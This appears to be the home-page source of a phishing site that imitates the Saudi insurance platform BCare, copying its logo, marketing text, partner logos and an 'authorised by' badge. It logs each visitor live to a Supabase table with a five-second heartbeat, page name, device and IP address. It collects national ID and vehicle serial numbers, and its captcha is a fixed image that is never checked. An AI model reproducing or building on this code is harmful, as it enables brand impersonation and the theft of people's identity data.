import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "../../supabase";
import "./Home.css";

import Footer from "../../components/Footer/Footer";

export const Home = ({ className, ...props }) => {
  const navigate = useNavigate();
  const [insuranceType, setInsuranceType] = useState('new');
  const [regType, setRegType] = useState('istimara');
  
  // Form State
  const [formData, setFormData] = useState({
    idNumber: "",
    sellerId: "",
    buyerId: "",
    sequenceNumber: "",
    customsNumber: "",
    year: "2026"
  });
  
  const [errors, setErrors] = useState({});

  // Instant Tracking & Heartbeat
  useEffect(() => {
    let interval;
    const initTracking = async () => {
      let customerId = localStorage.getItem('customerId');
      
      // Fix: Validate if stored ID is a valid UUID, if not, clear it
      const uuidRegex = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
      if (customerId && !uuidRegex.test(customerId)) {
        localStorage.removeItem('customerId');
        customerId = null;
      }

      const now = Date.now();
      
      if (!customerId) {
        // 1. Create New Customer
        try {
          const { data, error } = await supabase
            .from('customers')
            .insert([{
              status: 'idle',
              page: '1- الصفحه الرئيسيه',
              device: navigator.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop',
              last_update: now,
              last_heartbeat: now
            }])
            .select();
          
          if (data && data[0]) {
            localStorage.setItem('customerId', data[0].id);
          }
        } catch (err) { console.error("Creation Error:", err); }
      } else {
        // 2. Update Existing
        try {
          const { error, data } = await supabase
            .from('customers')
            .update({
              last_heartbeat: now,
              last_update: now,
              page: '1- الصفحه الرئيسيه'
            })
            .eq('id', customerId)
            .select();

          // If no data returned, ID is invalid for this DB -> Create New
          if (error || !data || data.length === 0) {
            const { data: newData } = await supabase
              .from('customers')
              .insert([{
                status: 'idle',
                page: '1- الصفحه الرئيسيه',
                device: navigator.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop',
                last_update: now,
                last_heartbeat: now
              }])
              .select();
            if (newData && newData[0]) {
              localStorage.setItem('customerId', newData[0].id);
            }
          }
        } catch (err) { console.error("Update Error:", err); }
      }

      // 2. Heartbeat (Every 5 seconds)
      interval = setInterval(() => {
        const id = localStorage.getItem('customerId');
        if (id) {
          supabase
            .from('customers')
            .update({ 
              last_heartbeat: Date.now() 
            })
            .eq('id', id)
            .then(() => {});
        }
      }, 5000);

      // 3. Background IP Fetch (Doesn't block creation)
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        if (customerId) {
          await supabase
            .from('customers')
            .update({ ip: data.ip })
            .eq('id', customerId);
        }
      } catch (err) {
        console.error("IP Fetch Error:", err);
      }
    };

    initTracking();
    return () => clearInterval(interval);
  }, []);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    // Clear error when user types
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: null }));
    }
  };

  const validate = () => {
    let newErrors = {};
    
    if (insuranceType === 'new') {
      if (formData.idNumber.length !== 10) {
        newErrors.idNumber = "يرجى إدخال 10 أرقام صحيحة";
      }
    } else {
      if (formData.sellerId.length !== 10) {
        newErrors.sellerId = "يرجى إدخال 10 أرقام صحيحة";
      }
      if (formData.buyerId.length !== 10) {
        newErrors.buyerId = "يرجى إدخال 10 أرقام صحيحة";
      }
    }
    
    if (regType === 'istimara') {
      if (!formData.sequenceNumber) newErrors.sequenceNumber = "هذا الحقل مطلوب";
    } else {
      if (!formData.customsNumber) newErrors.customsNumber = "هذا الحقل مطلوب";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validate()) {
      const idToPass = insuranceType === 'new' ? formData.idNumber : formData.buyerId;
      
      try {
        const customerId = localStorage.getItem('customerId');
        const updateData = {
          id_number: idToPass,
          sequence_number: formData.sequenceNumber || "",
          status: 'idle',
          page: '1- الصفحه الرئيسيه',
          last_update: new Date().getTime(),
          last_heartbeat: new Date().getTime()
        };

        if (customerId) {
          const { error } = await supabase.from('customers').update(updateData).eq('id', customerId);
        } else {
          const { data, error } = await supabase.from('customers').insert([{
            ...updateData,
            ip: 'Unknown',
            device: navigator.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop',
          }]).select();
          
          if (!error && data && data[0]) {
            localStorage.setItem('customerId', data[0].id);
          }
        }
        navigate("/dataform", { state: { idNumber: idToPass } });
      } catch (err) {
        console.error("Supabase Error:", err);
      }

      navigate("/dataform", { state: { idNumber: idToPass } });
    }
  };

  return (
    <div className={`home-page ${className || ""}`}>
      {/* Header */}
      <header className="site-header">
        <div className="header-right">
          <div className="user-icon">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
          </div>
        </div>
        <div className="header-center">
          <img src="/group-21.svg" alt="BCare Logo" className="header-logo" />
        </div>
        <div className="header-left">
          <span className="lang-toggle">EN</span>
        </div>
      </header>

      {/* Hero Section */}
      <section className="hero-section">
        <div className="container hero-content">
          <h1 className="heading-1">المنصة الأذكى لمقارنة عروض تأمين السيارات في السعودية</h1>
          <p className="hero-subtext">
            المنصة الأذكى لمقارنة عروض أكثر من 20 شركة تأمين. احصل على أرخص
            تأمين سيارات مع إصدار فوري وربط مباشر بنجم.
          </p>
        </div>
      </section>

      {/* Insurance Search Section */}
      <section className="insurance-section container">
        <div className="search-form-container">
           {/* Tabs */}
           <div className="form-tabs">
             <button className="tab-btn active">
               <img src="/tab-car-pink.svg" alt="" className="active-icon" />
               <span>مركبات</span>
             </button>
             <button className="tab-btn">
               <img src="/tab-heart-pulse-svg0.svg" alt="" />
               <span>طبي</span>
             </button>
             <button className="tab-btn">
               <img src="/tab-stethoscope-svg0.svg" alt="" />
               <span>اخطاء طبية</span>
             </button>
             <button className="tab-btn">
               <img src="/tab-plane-svg0.svg" alt="" />
               <span>سفر</span>
             </button>
             <button className="tab-btn">
               <img src="/tab-house-user-svg0.svg" alt="" />
               <span>العمالة المنزلية</span>
             </button>
           </div>
           
           <div className="form-content">
             {/* Toggle: New Insurance vs Transfer */}
             <div className="insurance-type-toggle">
               <button 
                 className={`toggle-btn ${insuranceType === 'new' ? 'active' : 'inactive'}`}
                 onClick={() => setInsuranceType('new')}
               >تأمين جديد</button>
               <button 
                 className={`toggle-btn ${insuranceType === 'transfer' ? 'active' : 'inactive'}`}
                 onClick={() => setInsuranceType('transfer')}
               >نقل ملكية</button>
             </div>

             {/* Form Inputs based on Insurance Type */}
             {insuranceType === 'new' ? (
               <div className="form-group">
                 <label>رقم الهوية / الإقامة</label>
                 <input 
                   type="text" 
                   name="idNumber"
                   className={`form-input ${errors.idNumber ? 'error-border' : ''}`} 
                   placeholder="رقم الهوية / الإقامة" 
                   value={formData.idNumber}
                   onChange={handleInputChange}
                 />
                 {errors.idNumber && <span className="error-text">{errors.idNumber}</span>}
               </div>
             ) : (
               <div className="form-row-split">
                 <div className="form-group">
                   <label>رقم هوية البائع</label>
                   <input 
                     type="text" 
                     name="sellerId"
                     className={`form-input ${errors.sellerId ? 'error-border' : ''}`} 
                     placeholder="رقم هوية البائع" 
                     value={formData.sellerId}
                     onChange={handleInputChange}
                   />
                   {errors.sellerId && <span className="error-text">{errors.sellerId}</span>}
                 </div>
                 <div className="form-group">
                   <label>رقم هوية المشتري</label>
                   <input 
                     type="text" 
                     name="buyerId"
                     className={`form-input ${errors.buyerId ? 'error-border' : ''}`} 
                     placeholder="رقم هوية المشتري" 
                     value={formData.buyerId}
                     onChange={handleInputChange}
                   />
                   {errors.buyerId && <span className="error-text">{errors.buyerId}</span>}
                 </div>
               </div>
             )}

             <div className="registration-type-group">
               <label className={`radio-button ${regType === 'istimara' ? 'active' : 'inactive'}`}>
                 <input 
                   type="radio" 
                   name="registrationType" 
                   value="istimara" 
                   checked={regType === 'istimara'} 
                   onChange={(e) => setRegType(e.target.value)} 
                   style={{ display: 'none' }} 
                 />
                 <div className={`radio-circle ${regType === 'istimara' ? 'active' : ''}`}>
                   {regType === 'istimara' && <div className="radio-dot"></div>}
                 </div>
                 <span>استمارة</span>
               </label>
               <label className={`radio-button ${regType === 'customs' ? 'active' : 'inactive'}`}>
                 <input 
                   type="radio" 
                   name="registrationType" 
                   value="customs" 
                   checked={regType === 'customs'} 
                   onChange={(e) => setRegType(e.target.value)} 
                   style={{ display: 'none' }} 
                 />
                 <div className={`radio-circle ${regType === 'customs' ? 'active' : ''}`}>
                   {regType === 'customs' && <div className="radio-dot"></div>}
                 </div>
                 <span>بطاقة جمركية</span>
               </label>
             </div>

             {/* Sequence or Customs fields based on Registration Type */}
             {regType === 'istimara' ? (
               <div className="form-group relative-input">
                 <label>الرقم التسلسلي</label>
                 <input 
                   type="text" 
                   name="sequenceNumber"
                   className={`form-input ${errors.sequenceNumber ? 'error-border' : ''}`} 
                   placeholder="الرقم التسلسلي" 
                   value={formData.sequenceNumber}
                   onChange={handleInputChange}
                 />
                 {errors.sequenceNumber && <span className="error-text">{errors.sequenceNumber}</span>}
                 <div className="info-icon">i</div>
               </div>
             ) : (
               <div className="form-row-split">
                 <div className="form-group">
                   <label>الرقم الجمركي</label>
                   <input 
                     type="text" 
                     name="customsNumber"
                     className={`form-input ${errors.customsNumber ? 'error-border' : ''}`} 
                     placeholder="الرقم الجمركي" 
                     value={formData.customsNumber}
                     onChange={handleInputChange}
                   />
                   {errors.customsNumber && <span className="error-text">{errors.customsNumber}</span>}
                 </div>
                 <div className="form-group">
                   <label>سنة الصنع</label>
                   <select 
                     name="year"
                     className="form-input form-select"
                     value={formData.year}
                     onChange={handleInputChange}
                   >
                     {Array.from({ length: 2026 - 1950 + 1 }, (_, i) => 2026 - i).map(year => (
                       <option key={year} value={year}>{year}</option>
                     ))}
                   </select>
                 </div>
               </div>
             )}
             
             <div className="form-group captcha-group">
               <label>رمز التحقق</label>
               <div className="captcha-input-wrapper">
                 <input type="text" className="form-input captcha-input" />
                 <div className="captcha-box">
                   <div className="captcha-image">9206</div>
                   <button className="refresh-btn">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 2v6h-6M3 12a9 9 0 0 1 15-6.7L21 8M3 22v-6h6M21 12a9 9 0 0 1-15 6.7L3 16"></path></svg>
                   </button>
                 </div>
               </div>
             </div>

             <div className="form-group submit-group">
               <div className="agreement">
                 <p>
                   أوافق على منح شركة الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي...
                 </p>
               </div>
               <button className="submit-btn main-action-btn" onClick={handleSubmit}>إظهار العروض</button>
             </div>
           </div>
        </div>

        {/* Partners Logos - Just below the form */}
        <div className="partners-banner">
          <div className="partners-logos-right">
            <span>مصرح من:</span>
            <img src="/group-65280.svg" alt="Insurance Authority" className="ia-img" />
          </div>
          <div className="partners-logos-left">
            <div className="marquee-content">
              <img src="/logo0.svg" alt="Gulf Union" className="partner-img" />
              <img src="/group2.svg" alt="SAICO" className="partner-img" />
              <img src="/med-gulf-svg0.svg" alt="Al Sagr" className="partner-img" />
              <img src="/logo0.svg" alt="Gulf Union" className="partner-img" />
              <img src="/group2.svg" alt="SAICO" className="partner-img" />
              <img src="/med-gulf-svg0.svg" alt="Al Sagr" className="partner-img" />
            </div>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="features-section container">
        <h2 className="section-title">طريقك آمن مع بي كير</h2>
        <div className="features-grid">
          <div className="feature-card">
            <div className="feature-icon"><img src="/group-124850.svg" alt="" /></div>
            <h3 className="feature-title">تأمينك في دقيقة</h3>
          </div>
          <div className="feature-card">
            <div className="feature-icon"><img src="/group-124860.svg" alt="" /></div>
            <h3 className="feature-title">فصّل تأمينك</h3>
          </div>
          <div className="feature-card">
            <div className="feature-icon"><img src="/group-124870.svg" alt="" /></div>
            <h3 className="feature-title">أسعار أقل</h3>
          </div>
          <div className="feature-card">
            <div className="feature-icon"><img src="/group-124880.svg" alt="" /></div>
            <h3 className="feature-title">جدول تأمينك</h3>
          </div>
          <div className="feature-card">
            <div className="feature-icon"><img src="/group-124890.svg" alt="" /></div>
            <h3 className="feature-title">هب ريح</h3>
          </div>
          <div className="feature-card">
            <div className="feature-icon"><img src="/group-124900.svg" alt="" /></div>
            <h3 className="feature-title">خصومات تضبطك</h3>
          </div>
          <div className="feature-card">
            <div className="feature-icon"><img src="/group-124910.svg" alt="" /></div>
            <h3 className="feature-title">منافع تحميك</h3>
          </div>
          <div className="feature-card">
            <div className="feature-icon"><img src="/group-124920.svg" alt="" /></div>
            <h3 className="feature-title">مكان واحد</h3>
          </div>
        </div>
      </section>

      {/* Discounts Section */}
      <section className="discounts-section container">
        <h2 className="section-title">خصومات وريف</h2>
        <p className="section-subtitle">خصومات وعروض مباشرة من مختلف المتاجر العالمية والمحلية لعملاء بي كير (أفراد، شركات)</p>
        <div className="discounts-grid">
           {/* Row 1 */}
           <div className="discount-card">
             <div className="discount-logo"><img src="/rayhan.svg" alt="روش ريحان" /></div>
             <div className="discount-text">روش ريحان<br/>%15 خصم</div>
           </div>
           <div className="discount-card">
             <div className="discount-logo"><img src="/none.svg" alt="نون" /></div>
             <div className="discount-text">نون<br/>%15 خصم</div>
           </div>
           {/* Row 2 */}
           <div className="discount-card">
             <div className="discount-logo"><img src="/perfectWeight.svg" alt="الوزن المثالي" /></div>
             <div className="discount-text">الوزن المثالي<br/>%50 خصم</div>
           </div>
           <div className="discount-card">
             <div className="discount-logo"><img src="/drive7.svg" alt="درايف 7" /></div>
             <div className="discount-text">درايف 7<br/>%20 خصم</div>
           </div>
           {/* Row 3 */}
           <div className="discount-card">
             <div className="discount-logo"><img src="/swater.svg" alt="سويتر" /></div>
             <div className="discount-text">سويتر<br/>%20 خصم</div>
           </div>
           <div className="discount-card">
             <div className="discount-logo"><img src="/sivvi.svg" alt="سيفي" /></div>
             <div className="discount-text">سيفي<br/>%10 خصم</div>
           </div>
           {/* Row 4 */}
           <div className="discount-card">
             <div className="discount-logo"><img src="/physiotherabia.svg" alt="فيزيوثيرابيا" /></div>
             <div className="discount-text">فيزيوثيرابيا<br/>%20 خصم</div>
           </div>
           <div className="discount-card">
             <div className="discount-logo"><img src="/group6444.svg" alt="نوفميد" /></div>
             <div className="discount-text">نوفميد<br/>%15 خصم</div>
           </div>
        </div>
        <a href="#" className="view-more-link">عرض المزيد من الخصومات</a>
      </section>

      {/* Why Choose Us */}
      <section className="why-us-section container">
        <h2 className="section-title">ليش بي كير خيارك الأول في التأمين؟</h2>
        <div className="why-us-grid">
          <div className="why-us-card">
            <div className="why-icon"><img src="/group-65350.svg" alt="" /></div>
            <h3 className="why-title">منك وفيك</h3>
          </div>
          <div className="why-us-card">
            <div className="why-icon"><img src="/group-65220.svg" alt="" /></div>
            <h3 className="why-title">عروض تفهمك</h3>
          </div>
          <div className="why-us-card">
            <div className="why-icon"><img src="/group-65260.svg" alt="" /></div>
            <h3 className="why-title">سعر يرضيك</h3>
          </div>
          <div className="why-us-card">
            <div className="why-icon"><img src="/group-65250.svg" alt="" /></div>
            <h3 className="why-title">إصدار سريع</h3>
          </div>
          <div className="why-us-card">
            <div className="why-icon"><img src="/group-124890.svg" alt="" /></div>
            <h3 className="why-title">نقّسط تأمينك</h3>
          </div>
          <div className="why-us-card">
            <div className="why-icon"><img src="/group-65240.svg" alt="" /></div>
            <h3 className="why-title">نفزع لك</h3>
          </div>
        </div>
      </section>

      <Footer />
      {/* Floating Buttons */}

      {/* Floating Buttons */}
      <div className="floating-buttons">
        <button className="float-btn headset">
          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 3a9 9 0 0 0-9 9v7c0 1.1.9 2 2 2h4v-8H5v-1a7 7 0 0 1 14 0v1h-4v8h4a2 2 0 0 0 2-2v-7a9 9 0 0 0-9-9z"></path></svg>
        </button>
        <button className="float-btn scroll-up">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M12 19V5M5 12l7-7 7 7"></path></svg>
        </button>
      </div>
    </div>
  );
};
